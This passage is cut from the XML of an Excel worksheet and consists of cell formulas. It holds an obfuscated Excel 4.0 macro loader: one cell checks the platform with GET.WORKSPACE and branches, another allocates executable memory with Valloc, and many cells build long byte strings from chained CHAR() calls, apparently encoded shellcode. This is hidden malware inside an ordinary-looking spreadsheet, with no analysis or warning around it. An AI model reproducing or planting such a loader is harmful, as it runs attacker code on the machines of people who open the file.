(72)&amp;CHAR(238)&amp;CHAR(61)&amp;CHAR(31)&amp;CHAR(232)&amp;CHAR(141)&amp;CHAR(213)&amp;CHAR(71)&amp;CHAR(88)&amp;CHAR(5)&amp;CHAR(236)&amp;CHAR(231)&amp;CHAR(119)&amp;CHAR(152)&amp;CHAR(38)&amp;CHAR(138)&amp;CHAR(45)</f>
        <v>^§þ_x0017_Ï_x0017_åªìyHŒ•ÃäƒJ0_x000B_8ê‰ƒs”j¶÷hÍ Ê(@ô=ä¸‰$ŸJÖ¬ “Å/µŸË@ œ™RØþóï$±:~v"¥ˆ°Tn%_x000F_?_î
™©u_x000F_’,ä_x0014_âÃ_x001D_ }¿Òk_x0013_[~@_x001A_®‚&amp;Ýw_x001E_&amp;¿ÅuõB°ºÃ_x0004_©Yôîj_x001B_eJð_Y_x0011_ÈæT‹Ÿ–)N©Í´_x0014_¡AmJŽ÷­.HFÊÜ_x0010_Í%Õ·š‹_x0015_«¯_x0012__x0012_"®d_x0003_Š„ëyŒœ)0ÕŒè_x000B_£ÄÑJ:m_x0008__x0010_÷÷N†Œ[jÂ…›+
Bµ¬¦µÛÌàÈ—œUÔ_x0019_ŠÿŽ@ÈŠî«(@EÓk_x000C_HÉEnHî=_x001F_èÕGX_x0005_ìçw˜&amp;Š-</v>
      </c>
      <c r="C8" t="str">
        <f>CHAR(253)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(89)&amp;CHAR(46)&amp;CHAR(204)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(179)&amp;CHAR(254)</f>
        <v>ýÏ&gt;Y.Ì!¥³þ</v>
      </c>
    </row>
    <row r="9" spans="1:4" x14ac:dyDescent="0.25">
      <c r="A9" t="b">
        <f>IF(ISNUMBER(SEARCH("32",GET.WORKSPACE(1))),GOTO(A10),GOTO(A21))</f>
        <v>1</v>
      </c>
      <c r="B9" t="str">
        <f>CHAR(76)&amp;CHAR(129)&amp;CHAR(45)&amp;CHAR(169)&amp;CHAR(243)&amp;CHAR(161)&amp;CHAR(111)&amp;CHAR(129)&amp;CHAR(152)&amp;CHAR(169)&amp;CHAR(3)&amp;CHAR(142)&amp;CHAR(107)&amp;CHAR(78)&amp;CHAR(117)&amp;CHAR(14)&amp;CHAR(27)&amp;CHAR(29)&amp;CHAR(2)&amp;CHAR(74)&amp;CHAR(64)&amp;CHAR(125)&amp;CHAR(166)&amp;CHAR(196)&amp;CHAR(200)&amp;CHAR(128)&amp;CHAR(59)&amp;CHAR(75)&amp;CHAR(200)&amp;CHAR(48)&amp;CHAR(52)&amp;CHAR(114)&amp;CHAR(241)&amp;CHAR(233)&amp;CHAR(252)&amp;CHAR(21)&amp;CHAR(236)&amp;CHAR(102)&amp;CHAR(5)&amp;CHAR(80)&amp;CHAR(206)&amp;CHAR(127)&amp;CHAR(132)&amp;CHAR(100)&amp;CHAR(62)&amp;CHAR(161)&amp;CHAR(216)&amp;CHAR(97)&amp;CHAR(247)&amp;CHAR(102)&amp;CHAR(156)&amp;CHAR(68)&amp;CHAR(157)&amp;CHAR(127)&amp;CHAR(59)&amp;CHAR(210)&amp;CHAR(20)&amp;CHAR(145)&amp;CHAR(120)&amp;CHAR(154)&amp;CHAR(121)&amp;CHAR(59)&amp;CHAR(156)&amp;CHAR(63)&amp;CHAR(48)&amp;CHAR(216)&amp;CHAR(51)&amp;CHAR(52)&amp;CHAR(237)&amp;CHAR(237)&amp;CHAR(168)&amp;CHAR(135)&amp;CHAR(166)&amp;CHAR(112)&amp;CHAR(71)&amp;CHAR(120)&amp;CHAR(246)&amp;CHAR(168)&amp;CHAR(160)&amp;CHAR(35)&amp;CHAR(113)&amp;CHAR(7)&amp;CHAR(240)&amp;CHAR(119)&amp;CHAR(136)&amp;CHAR(121)&amp;CHAR(77)&amp;CHAR(213)&amp;CHAR(112)&amp;CHAR(58)&amp;CHAR(232)&amp;CHAR(224)&amp;CHAR(89)&amp;CHAR(182)&amp;CHAR(140)&amp;CHAR(134)&amp;CHAR(185)&amp;CHAR(44)&amp;CHAR(26)&amp;CHAR(208)&amp;CHAR(92)&amp;CHAR(240)&amp;CHAR(2)&amp;CHAR(187)&amp;CHAR(31)&amp;CHAR(147)&amp;CHAR(11)&amp;CHAR(195)&amp;CHAR(169)&amp;CHAR(14)&amp;CHAR(127)&amp;CHAR(117)&amp;CHAR(242)&amp;CHAR(118)&amp;CHAR(137)&amp;CHAR(155)&amp;CHAR(251)&amp;CHAR(45)&amp;CHAR(18)&amp;CHAR(73)&amp;CHAR(252)&amp;CHAR(118)&amp;CHAR(244)&amp;CHAR(149)&amp;CHAR(120)&amp;CHAR(170)&amp;CHAR(216)&amp;CHAR(171)&amp;CHAR(173)&amp;CHAR(137)&amp;CHAR(18)&amp;CHAR(237)&amp;CHAR(112)&amp;CHAR(80)&amp;CHAR(53)&amp;CHAR(175)&amp;CHAR(244)&amp;CHAR(111)&amp;CHAR(226)&amp;CHAR(105)&amp;CHAR(241)&amp;CHAR(21)&amp;CHAR(158)&amp;CHAR(104)&amp;CHAR(99)&amp;CHAR(49)&amp;CHAR(255)&amp;CHAR(205)&amp;CHAR(225)&amp;CHAR(18)&amp;CHAR(167)&amp;CHAR(194)&amp;CHAR(180)&amp;CHAR(53)&amp;CHAR(122)&amp;CHAR(140)&amp;CHAR(216)&amp;CHAR(10)&amp;CHAR(151)&amp;CHAR(228)&amp;CHAR(201)&amp;CHAR(145)&amp;CHAR(61)&amp;CHAR(142)&amp;CHAR(133)&amp;CHAR(106)&amp;CHAR(241)&amp;CHAR(3)&amp;CHAR(95)&amp;CHAR(158)&amp;CHAR(235)&amp;CHAR(200)&amp;CHAR(176)&amp;CHAR(161)&amp;CHAR(205)&amp;CHAR(103)&amp;CHAR(151)&amp;CHAR(70)&amp;CHAR(13)&amp;CHAR(114)&amp;CHAR(193)&amp;CHAR(185)&amp;CHAR(120)&amp;CHAR(177)&amp;CHAR(195)&amp;CHAR(141)&amp;CHAR(128)&amp;CHAR(191)&amp;CHAR(241)&amp;CHAR(189)&amp;CHAR(228)&amp;CHAR(177)&amp;CHAR(92)&amp;CHAR(18)&amp;CHAR(22)&amp;CHAR(162)&amp;CHAR(49)&amp;CHAR(190)&amp;CHAR(160)&amp;CHAR(71)&amp;CHAR(229)&amp;CHAR(39)&amp;CHAR(222)&amp;CHAR(158)&amp;CHAR(63)&amp;CHAR(173)&amp;CHAR(38)&amp;CHAR(91)&amp;CHAR(188)&amp;CHAR(18)&amp;CHAR(228)&amp;CHAR(15)&amp;CHAR(15)&amp;CHAR(232)&amp;CHAR(89)&amp;CHAR(50)&amp;CHAR(97)&amp;CHAR(149)&amp;CHAR(160)&amp;CHAR(70)&amp;CHAR(72)&amp;CHAR(98)&amp;CHAR(210)&amp;CHAR(76)&amp;CHAR(227)&amp;CHAR(251)&amp;CHAR(213)&amp;CHAR(237)&amp;CHAR(251)&amp;CHAR(201)&amp;CHAR(76)&amp;CHAR(211)&amp;CHAR(65)&amp;CHAR(47)&amp;CHAR(113)&amp;CHAR(12)&amp;CHAR(19)&amp;CHAR(120)&amp;CHAR(186)&amp;CHAR(176)&amp;CHAR(81)&amp;CHAR(109)&amp;CHAR(56)&amp;CHAR(178)&amp;CHAR(43)&amp;CHAR(208)&amp;CHAR(211)&amp;CHAR(7)&amp;CHAR(96)&amp;CHAR(151)&amp;CHAR(12)&amp;CHAR(8)&amp;CHAR(116)&amp;CHAR(44)&amp;CHAR(40)</f>
        <v>L-©ó¡o˜©_x0003_ŽkNu_x000E__x001B__x001D__x0002_J@}¦ÄÈ€;KÈ04rñéü_x0015_ìf_x0005_PÎ„d&gt;¡Øa÷fœD;Ò_x0014_‘xšy;œ?0Ø34íí¨‡¦pGxö¨ #q_x0007_ðwˆyMÕp:èàY¶Œ†¹,_x001A_Ð\ð_x0002_»_x001F_“_x000B_Ã©_x000E_uòv‰›û-_x0012_Iüvô•xªØ«­‰_x0012_ípP5¯ôoâiñ_x0015_žhc1ÿÍá_x0012_§Â´5zŒØ
—äÉ‘=Ž…jñ_x0003__žëÈ°¡Íg—F_x000D_rÁ¹x±Ã€¿ñ½ä±\_x0012__x0016_¢1¾ Gå'Þž?­&amp;[¼_x0012_ä_x000F__x000F_èY2a• FHbÒLãûÕíûÉLÓA/q_x000C__x0013_xº°Qm8²+ÐÓ_x0007_`—_x000C__x0008_t,(</v>
      </c>
      <c r="C9" t="str">
        <f>CHAR(247)&amp;CHAR(11)&amp;CHAR(214)&amp;CHAR(203)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(186)&amp;CHAR(119)&amp;CHAR(62)&amp;CHAR(161)</f>
        <v>÷_x000B_ÖË!¥ºw&gt;¡</v>
      </c>
    </row>
    <row r="10" spans="1:4" x14ac:dyDescent="0.25">
      <c r="A10">
        <f>Valloc(0,65536,4096,64)</f>
        <v>54329344</v>
      </c>
      <c r="B10" t="str">
        <f>CHAR(9)&amp;CHAR(196)&amp;CHAR(25)&amp;CHAR(52)&amp;CHAR(165)&amp;CHAR(100)&amp;CHAR(132)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(104)&amp;CHAR(214)&amp;CHAR(81)&amp;CHAR(221)&amp;CHAR(132)&amp;CHAR(230)&amp;CHAR(223)&amp;CHAR(51)&amp;CHAR(168)&amp;CHAR(45)&amp;CHAR(185)&amp;CHAR(195)&amp;CHAR(157)&amp;CHAR(5)&amp;CHAR(165)&amp;CHAR(67)&amp;CHAR(56)&amp;CHAR(98)&amp;CHAR(210)&amp;CHAR(226)&amp;CHAR(250)&amp;CHAR(104)&amp;CHAR(173)&amp;CHAR(19)&amp;CHAR(231)&amp;CHAR(17)&amp;CHAR(203)&amp;CHAR(48)&amp;CHAR(50)&amp;CHAR(78)&amp;CHAR(40)&amp;CHAR(239)&amp;CHAR(218)&amp;CHAR(6)&amp;CHAR(141)&amp;CHAR(233)&amp;CHAR(100)&amp;CHAR(129)&amp;CHAR(250)&amp;CHAR(70)&amp;CHAR(254)&amp;CHAR(53)&amp;CHAR(47)&amp;CHAR(11)&amp;CHAR(50)&amp;CHAR(11)&amp;CHAR(231)&amp;CHAR(155)&amp;CHAR(32)&amp;CHAR(140)&amp;CHAR(105)&amp;CHAR(208)&amp;CHAR(146)&amp;CHAR(170)&amp;CHAR(117)&amp;CHAR(166)&amp;CHAR(187)&amp;CHAR(230)&amp;CHAR(164)&amp;CHAR(252)&amp;CHAR(82)&amp;CHAR(207)&amp;CHAR(109)&amp;CHAR(28)&amp;CHAR(216)&amp;CHAR(205)&amp;CHAR(81)&amp;CHAR(120)&amp;CHAR(215)&amp;CHAR(147)&amp;CHAR(101)&amp;CHAR(8)&amp;CHAR(214)&amp;CHAR(179)&amp;CHAR(92)&amp;CHAR(11)&amp;CHAR(173)&amp;CHAR(192)&amp;CHAR(135)&amp;CHAR(190)&amp;CHAR(31)&amp;CHAR(208)&amp;CHAR(220)&amp;CHAR(225)&amp;CHAR(225)&amp;CHAR(213)&amp;CHAR(125)&amp;CHAR(29)&amp;CHAR(28)&amp;CHAR(224)&amp;CHAR(39)&amp;CHAR(83)&amp;CHAR(106)&amp;CHAR(246)&amp;CHAR(194)&amp;CHAR(172)&amp;CHAR(188)&amp;CHAR(192)&amp;CHAR(97)&amp;CHAR(14)&amp;CHAR(38)&amp;CHAR(211)&amp;CHAR(33)&amp;CHAR(102)&amp;CHAR(108)&amp;CHAR(161)&amp;CHAR(108)&amp;CHAR(88)&amp;CHAR(129)&amp;CHAR(107)&amp;CHAR(121)&amp;CHAR(206)&amp;CHAR(133)&amp;CHAR(24)&amp;CHAR(84)&amp;CHAR(43)&amp;CHAR(229)&amp;CHAR(166)&amp;CHAR(27)&amp;CHAR(252)&amp;CHAR(78)&amp;CHAR(191)&amp;CHAR(101)&amp;CHAR(29)&amp;CHAR(180)&amp;CHAR(24)&amp;CHAR(208)&amp;CHAR(117)&amp;CHAR(146)&amp;CHAR(117)&amp;CHAR(206)&amp;CHAR(87)&amp;CHAR(115)&amp;CHAR(125)&amp;CHAR(254)&amp;CHAR(228)&amp;CHAR(251)&amp;CHAR(85)&amp;CHAR(10)&amp;CHAR(130)&amp;CHAR(110)&amp;CHAR(80)&amp;CHAR(125)&amp;CHAR(192)&amp;CHAR(43)&amp;CHAR(248)&amp;CHAR(144)&amp;CHAR(90)&amp;CHAR(190)&amp;CHAR(109)&amp;CHAR(71)&amp;CHAR(178)&amp;CHAR(69)&amp;CHAR(55)&amp;CHAR(28)&amp;CHAR(194)&amp;CHAR(115)&amp;CHAR(176)&amp;CHAR(63)&amp;CHAR(93)&amp;CHAR(249)&amp;CHAR(234)&amp;CHAR(107)&amp;CHAR(36)&amp;CHAR(138)&amp;CHAR(70)&amp;CHAR(77)&amp;CHAR(248)&amp;CHAR(219)&amp;CHAR(14)&amp;CHAR(61)&amp;CHAR(146)&amp;CHAR(102)&amp;CHAR(202)&amp;CHAR(53)&amp;CHAR(43)&amp;CHAR(213)&amp;CHAR(222)&amp;CHAR(168)&amp;CHAR(245)&amp;CHAR(230)&amp;CHAR(57)&amp;CHAR(119)&amp;CHAR(87)&amp;CHAR(207)&amp;CHAR(76)&amp;CHAR(85)&amp;CHAR(38)&amp;CHAR(155)&amp;CHAR(16)&amp;CHAR(192)&amp;CHAR(4)&amp;CHAR(151)&amp;CHAR(206)&amp;CHAR(116)&amp;CHAR(138)&amp;CHAR(10)&amp;CHAR(64)&amp;CHAR(37)&amp;CHAR(85)&amp;CHAR(167)&amp;CHAR(226)&amp;CHAR(91)&amp;CHAR(85)&amp;CHAR(112)&amp;CHAR(242)&amp;CHAR(163)&amp;CHAR(68)&amp;CHAR(219)&amp;CHAR(86)&amp;CHAR(180)&amp;CHAR(45)&amp;CHAR(54)&amp;CHAR(71)&amp;CHAR(230)&amp;CHAR(150)&amp;CHAR(227)&amp;CHAR(15)&amp;CHAR(163)&amp;CHAR(37)&amp;CHAR(152)&amp;CHAR(180)&amp;CHAR(107)&amp;CHAR(51)&amp;CHAR(87)&amp;CHAR(242)&amp;CHAR(247)&amp;CHAR(35)&amp;CHAR(183)&amp;CHAR(163)&amp;CHAR(167)&amp;CHAR(148)&amp;CHAR(140)&amp;CHAR(147)&amp;CHAR(86)&amp;CHAR(241)&amp;CHAR(229)&amp;CHAR(172)&amp;CHAR(77)&amp;CHAR(250)&amp;CHAR(6)&amp;CHAR(224)&amp;CHAR(56)&amp;CHAR(252)&amp;CHAR(9)&amp;CHAR(209)</f>
        <v xml:space="preserve">	Ä_x0019_4¥d„	
hÖQÝ„æß3¨-¹Ã_x0005_¥C8bÒâúh­_x0013_ç_x0011_Ë02N(ïÚ_x0006_édúFþ5/_x000B_2_x000B_ç› ŒiÐ’ªu¦»æ¤üRÏm_x001C_ØÍQx×“e_x0008_Ö³\_x000B_­À‡¾_x001F_ÐÜááÕ}_x001D__x001C_à'SjöÂ¬¼Àa_x000E_&amp;Ó!fl¡lXkyÎ…_x0018_T+å¦_x001B_üN¿e_x001D_´_x0018_Ðu’uÎWs}þäûU
‚nP}À+øZ¾mG²E7_x001C_Âs°?]ùêk$ŠFMøÛ_x000E_=’fÊ5+ÕÞ¨õæ9wWÏLU&amp;›_x0010_À_x0004_—ÎtŠ
@%U§â[Upò£DÛV´-6Gæ–ã_x000F_£%˜´k3Wò÷#·£§”Œ“Vñå¬Mú_x0006_à8ü	Ñ</v>
      </c>
      <c r="C10" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(96)&amp;CHAR(28)&amp;CHAR(255)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(41)&amp;CHAR(24)</f>
        <v>ÖÈ`_x001C_ÿÏ&gt;±)_x0018_</v>
      </c>
    </row>
    <row r="11" spans="1:4" x14ac:dyDescent="0.25">
      <c r="A11" t="b">
        <f bx="1">main=$B$1</f>
        <v>1</v>
      </c>
      <c r="B11" t="str">
        <f>CHAR(26)&amp;CHAR(13)&amp;CHAR(152)&amp;CHAR(16)&amp;CHAR(203)&amp;CHAR(117)&amp;CHAR(50)&amp;CHAR(112)&amp;CHAR(147)&amp;CHAR(16)&amp;CHAR(43)&amp;CHAR(38)&amp;CHAR(111)&amp;CHAR(18)&amp;CHAR(139)&amp;CHAR(52)&amp;CHAR(141)&amp;CHAR(7)&amp;CHAR(241)&amp;CHAR(14)&amp;CHAR(190)&amp;CHAR(54)&amp;CHAR(245)&amp;CHAR(78)&amp;CHAR(215)&amp;CHAR(187)&amp;CHAR(251)&amp;CHAR(99)&amp;CHAR(8)&amp;CHAR(8)&amp;CHAR(62)&amp;CHAR(101)&amp;CHAR(148)&amp;CHAR(159)&amp;CHAR(246)&amp;CHAR(12)&amp;CHAR(54)&amp;CHAR(171)&amp;CHAR(179)&amp;CHAR(63)&amp;CHAR(249)&amp;CHAR(236)&amp;CHAR(28)&amp;CHAR(88)&amp;CHAR(12)&amp;CHAR(150)&amp;CHAR(127)&amp;CHAR(108)&amp;CHAR(218)&amp;CHAR(141)&amp;CHAR(83)&amp;CHAR(16)&amp;CHAR(99)&amp;CHAR(134)&amp;CHAR(97)&amp;CHAR(60)&amp;CHAR(195)&amp;CHAR(182)&amp;CHAR(161)&amp;CHAR(97)&amp;CHAR(127)&amp;CHAR(61)&amp;CHAR(100)&amp;CHAR(43)&amp;CHAR(108)&amp;CHAR(154)&amp;CHAR(202)&amp;CHAR(208)&amp;CHAR(141)&amp;CHAR(156)&amp;CHAR(31)&amp;CHAR(144)&amp;CHAR(247)&amp;CHAR(115)&amp;CHAR(68)&amp;CHAR(20)&amp;CHAR(172)&amp;CHAR(241)&amp;CHAR(173)&amp;CHAR(94)&amp;CHAR(76)&amp;CHAR(162)&amp;CHAR(1)&amp;CHAR(30)&amp;CHAR(202)&amp;CHAR(252)&amp;CHAR(186)&amp;CHAR(252)&amp;CHAR(250)&amp;CHAR(39)&amp;CHAR(195)&amp;CHAR(204)&amp;CHAR(91)&amp;CHAR(58)&amp;CHAR(110)&amp;CHAR(192)&amp;CHAR(196)&amp;CHAR(9)&amp;CHAR(185)&amp;CHAR(154)&amp;CHAR(187)&amp;CHAR(80)&amp;CHAR(235)&amp;CHAR(57)&amp;CHAR(16)&amp;CHAR(198)&amp;CHAR(199)&amp;CHAR(45)&amp;CHAR(4)&amp;CHAR(29)&amp;CHAR(88)&amp;CHAR(78)&amp;CHAR(24)&amp;CHAR(133)&amp;CHAR(17)&amp;CHAR(230)&amp;CHAR(4)&amp;CHAR(209)&amp;CHAR(35)&amp;CHAR(173)&amp;CHAR(110)&amp;CHAR(40)&amp;CHAR(127)&amp;CHAR(106)&amp;CHAR(242)&amp;CHAR(254)&amp;CHAR(61)&amp;CHAR(227)&amp;CHAR(225)&amp;CHAR(151)&amp;CHAR(69)&amp;CHAR(226)&amp;CHAR(239)&amp;CHAR(187)&amp;CHAR(152)&amp;CHAR(182)&amp;CHAR(112)&amp;CHAR(95)&amp;CHAR(234)&amp;CHAR(105)&amp;CHAR(94)&amp;CHAR(181)&amp;CHAR(200)&amp;CHAR(254)&amp;CHAR(84)&amp;CHAR(143)&amp;CHAR(117)&amp;CHAR(126)&amp;CHAR(172)&amp;CHAR(192)&amp;CHAR(54)&amp;CHAR(42)&amp;CHAR(240)&amp;CHAR(93)&amp;CHAR(96)&amp;CHAR(237)&amp;CHAR(55)&amp;CHAR(67)&amp;CHAR(90)&amp;CHAR(255)&amp;CHAR(122)&amp;CHAR(115)&amp;CHAR(57)&amp;CHAR(68)&amp;CHAR(224)&amp;CHAR(154)&amp;CHAR(254)&amp;CHAR(139)&amp;CHAR(227)&amp;CHAR(31)&amp;CHAR(178)&amp;CHAR(112)&amp;CHAR(30)&amp;CHAR(92)&amp;CHAR(221)&amp;CHAR(130)&amp;CHAR(50)&amp;CHAR(105)&amp;CHAR(156)&amp;CHAR(122)&amp;CHAR(109)&amp;CHAR(235)&amp;CHAR(226)&amp;CHAR(156)&amp;CHAR(75)&amp;CHAR(188)&amp;CHAR(180)&amp;CHAR(223)&amp;CHAR(94)&amp;CHAR(156)&amp;CHAR(67)&amp;CHAR(21)&amp;CHAR(222)&amp;CHAR(37)&amp;CHAR(95)&amp;CHAR(113)&amp;CHAR(80)&amp;CHAR(26)&amp;CHAR(159)&amp;CHAR(114)&amp;CHAR(135)&amp;CHAR(128)&amp;CHAR(129)&amp;CHAR(21)&amp;CHAR(123)&amp;CHAR(170)&amp;CHAR(82)&amp;CHAR(37)&amp;CHAR(230)&amp;CHAR(236)&amp;CHAR(45)&amp;CHAR(134)&amp;CHAR(161)&amp;CHAR(90)&amp;CHAR(51)&amp;CHAR(15)&amp;CHAR(124)&amp;CHAR(9)&amp;CHAR(116)&amp;CHAR(201)&amp;CHAR(118)&amp;CHAR(42)&amp;CHAR(72)&amp;CHAR(55)&amp;CHAR(71)&amp;CHAR(65)&amp;CHAR(189)&amp;CHAR(166)&amp;CHAR(176)&amp;CHAR(117)&amp;CHAR(178)&amp;CHAR(233)&amp;CHAR(72)&amp;CHAR(180)&amp;CHAR(137)&amp;CHAR(17)&amp;CHAR(168)&amp;CHAR(136)&amp;CHAR(39)&amp;CHAR(120)&amp;CHAR(51)&amp;CHAR(43)&amp;CHAR(1)&amp;CHAR(78)&amp;CHAR(193)&amp;CHAR(223)&amp;CHAR(145)&amp;CHAR(170)&amp;CHAR(184)&amp;CHAR(160)&amp;CHAR(200)&amp;CHAR(7)&amp;CHAR(213)&amp;CHAR(49)&amp;CHAR(66)</f>
        <v>_x001A__x000D_˜_x0010_Ëu2p“_x0010_+&amp;o_x0012_‹4_x0007_ñ_x000E_¾6õN×»ûc_x0008__x0008_&gt;e”Ÿö_x000C_6«³?ùì_x001C_X_x000C_–lÚS_x0010_c†a&lt;Ã¶¡a=d+lšÊÐœ_x001F_÷sD_x0014_¬ñ­^L¢_x0001__x001E_Êüºüú'ÃÌ[:nÀÄ	¹š»Pë9_x0010_ÆÇ-_x0004__x001D_XN_x0018_…_x0011_æ_x0004_Ñ#­n(jòþ=ãá—Eâï»˜¶p_êi^µÈþTu~¬À6*ð]`í7CZÿzs9Dàšþ‹ã_x001F_²p_x001E_\Ý‚2iœzmëâœK¼´ß^œC_x0015_Þ%_qP_x001A_Ÿr‡€_x0015_{ªR%æì-†¡Z3_x000F_|	tÉv*H7GA½¦°u²éH´‰_x0011_¨ˆ'x3+_x0001_NÁß‘ª¸ È_x0007_Õ1B</v>
      </c>
      <c r="C11" t="str">
        <f>CHAR(164)&amp;CHAR(101)&amp;CHAR(244)&amp;CHAR(75)&amp;CHAR(235)&amp;CHAR(181)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(68)&amp;CHAR(237)</f>
        <v>¤eôKëµÖÈDí</v>
      </c>
    </row>
    <row r="12" spans="1:4" x14ac:dyDescent="0.25">
      <c r="A12" t="b">
        <f>SET.VALUE(D1,0)</f>
        <v>1</v>
      </c>
      <c r="B12" t="str">
        <f>CHAR(88)&amp;CHAR(214)&amp;CHAR(95)&amp;CHAR(243)&amp;CHAR(27)&amp;CHAR(244)&amp;CHAR(63)&amp;CHAR(47)&amp;CHAR(86)&amp;CHAR(1)&amp;CHAR(199)&amp;CHAR(220)&amp;CHAR(148)&amp;CHAR(168)&amp;CHAR(194)&amp;CHAR(219)&amp;CHAR(140)&amp;CHAR(224)&amp;CHAR(166)&amp;CHAR(52)&amp;CHAR(167)&amp;CHAR(49)&amp;CHAR(103)&amp;CHAR(184)&amp;CHAR(67)&amp;CHAR(237)&amp;CHAR(5)&amp;CHAR(204)&amp;CHAR(85)&amp;CHAR(132)&amp;CHAR(230)&amp;CHAR(150)&amp;CHAR(9)&amp;CHAR(8)&amp;CHAR(253)&amp;CHAR(196)&amp;CHAR(244)&amp;CHAR(133)&amp;CHAR(173)&amp;CHAR(91)&amp;CHAR(216)&amp;CHAR(217)&amp;CHAR(121)&amp;CHAR(105)&amp;CHAR(70)&amp;CHAR(138)&amp;CHAR(91)&amp;CHAR(107)&amp;CHAR(197)&amp;CHAR(10)&amp;CHAR(66)&amp;CHAR(196)&amp;CHAR(173)&amp;CHAR(109)&amp;CHAR(249)&amp;CHAR(93)&amp;CHAR(243)&amp;CHAR(39)&amp;CHAR(86)&amp;CHAR(206)&amp;CHAR(21)&amp;CHAR(102)&amp;CHAR(11)&amp;CHAR(3)&amp;CHAR(27)&amp;CHAR(39)&amp;CHAR(206)&amp;CHAR(138)&amp;CHAR(36)&amp;CHAR(155)&amp;CHAR(137)&amp;CHAR(193)&amp;CHAR(145)&amp;CHAR(58)&amp;CHAR(185)&amp;CHAR(120)&amp;CHAR(174)&amp;CHAR(209)&amp;CHAR(83)&amp;CHAR(157)&amp;CHAR(41)&amp;CHAR(60)&amp;CHAR(49)&amp;CHAR(183)&amp;CHAR(191)&amp;CHAR(164)&amp;CHAR(186)&amp;CHAR(43)&amp;CHAR(7)&amp;CHAR(147)&amp;CHAR(45)&amp;CHAR(15)&amp;CHAR(255)&amp;CHAR(190)&amp;CHAR(242)&amp;CHAR(205)&amp;CHAR(60)&amp;CHAR(92)&amp;CHAR(240)&amp;CHAR(114)&amp;CHAR(192)&amp;CHAR(221)&amp;CHAR(197)&amp;CHAR(54)&amp;CHAR(189)&amp;CHAR(132)&amp;CHAR(253)&amp;CHAR(92)&amp;CHAR(178)&amp;CHAR(138)&amp;CHAR(177)&amp;CHAR(193)&amp;CHAR(22)&amp;CHAR(100)&amp;CHAR(210)&amp;CHAR(245)&amp;CHAR(199)&amp;CHAR(42)&amp;CHAR(102)&amp;CHAR(158)&amp;CHAR(228)&amp;CHAR(74)&amp;CHAR(206)&amp;CHAR(7)&amp;CHAR(134)&amp;CHAR(97)&amp;CHAR(149)&amp;CHAR(223)&amp;CHAR(251)&amp;CHAR(40)&amp;CHAR(77)&amp;CHAR(111)&amp;CHAR(78)&amp;CHAR(189)&amp;CHAR(107)&amp;CHAR(183)&amp;CHAR(36)&amp;CHAR(16)&amp;CHAR(30)&amp;CHAR(2)&amp;CHAR(200)&amp;CHAR(239)&amp;CHAR(117)&amp;CHAR(121)&amp;CHAR(232)&amp;CHAR(157)&amp;CHAR(156)&amp;CHAR(136)&amp;CHAR(222)&amp;CHAR(209)&amp;CHAR(212)&amp;CHAR(77)&amp;CHAR(35)&amp;CHAR(145)&amp;CHAR(59)&amp;CHAR(39)&amp;CHAR(12)&amp;CHAR(103)&amp;CHAR(244)&amp;CHAR(111)&amp;CHAR(128)&amp;CHAR(148)&amp;CHAR(178)&amp;CHAR(115)&amp;CHAR(86)&amp;CHAR(96)&amp;CHAR(16)&amp;CHAR(84)&amp;CHAR(102)&amp;CHAR(164)&amp;CHAR(193)&amp;CHAR(99)&amp;CHAR(173)&amp;CHAR(18)&amp;CHAR(108)&amp;CHAR(133)&amp;CHAR(4)&amp;CHAR(113)&amp;CHAR(213)&amp;CHAR(120)&amp;CHAR(194)&amp;CHAR(53)&amp;CHAR(8)&amp;CHAR(45)&amp;CHAR(51)&amp;CHAR(87)&amp;CHAR(152)&amp;CHAR(255)&amp;CHAR(142)&amp;CHAR(156)&amp;CHAR(135)&amp;CHAR(6)&amp;CHAR(212)&amp;CHAR(222)&amp;CHAR(124)&amp;CHAR(172)&amp;CHAR(38)&amp;CHAR(156)&amp;CHAR(73)&amp;CHAR(251)&amp;CHAR(230)&amp;CHAR(225)&amp;CHAR(80)&amp;CHAR(89)&amp;CHAR(255)&amp;CHAR(210)&amp;CHAR(210)&amp;CHAR(5)&amp;CHAR(175)&amp;CHAR(240)&amp;CHAR(172)&amp;CHAR(171)&amp;CHAR(163)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(126)&amp;CHAR(127)&amp;CHAR(245)&amp;CHAR(61)&amp;CHAR(220)&amp;CHAR(36)&amp;CHAR(181)&amp;CHAR(183)&amp;CHAR(196)&amp;CHAR(61)&amp;CHAR(82)&amp;CHAR(156)&amp;CHAR(30)&amp;CHAR(26)&amp;CHAR(241)&amp;CHAR(21)&amp;CHAR(185)&amp;CHAR(67)&amp;CHAR(90)&amp;CHAR(193)&amp;CHAR(230)&amp;CHAR(147)&amp;CHAR(141)&amp;CHAR(174)&amp;CHAR(163)&amp;CHAR(192)&amp;CHAR(224)&amp;CHAR(9)&amp;CHAR(179)&amp;CHAR(38)&amp;CHAR(125)&amp;CHAR(62)&amp;CHAR(3)&amp;CHAR(49)&amp;CHAR(12)&amp;CHAR(8)&amp;CHAR(5)&amp;CHAR(8)&amp;CHAR(246)&amp;CHAR(88)</f>
        <v>XÖ_ó_x001B_ô?/V_x0001_ÇÜ”¨ÂÛŒà¦4§1g¸Cí_x0005_ÌU„æ–	_x0008_ýÄô…­[ØÙyiFŠ[kÅ
BÄ­mù]ó'VÎ_x0015_f_x000B__x0003__x001B_'ÎŠ$›‰Á‘:¹x®ÑS)&lt;1·¿¤º+_x0007_“-_x000F_ÿ¾òÍ&lt;\ðrÀÝÅ6½„ý\²Š±Á_x0016_dÒõÇ*fžäJÎ_x0007_†a•ßû(MoN½k·$_x0010__x001E__x0002_ÈïuyèœˆÞÑÔM#‘;'_x000C_gôo€”²sV`_x0010_Tf¤Ác­_x0012_l…_x0004_qÕxÂ5_x0008_-3W˜ÿŽœ‡_x0006_ÔÞ|¬&amp;œIûæáPYÿÒÒ_x0005_¯ð¬«£_x0006__x0001_~õ=Ü$µ·Ä=Rœ_x001E__x001A_ñ_x0015_¹CZÁæ“®£Àà	³&amp;}&gt;_x0003_1_x000C__x0008__x0005__x0008_öX</v>
      </c>
      <c r="C12" t="str">
        <f>CHAR(112)&amp;CHAR(251)&amp;CHAR(27)&amp;CHAR(129)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(237)&amp;CHAR(114)&amp;CHAR(137)</f>
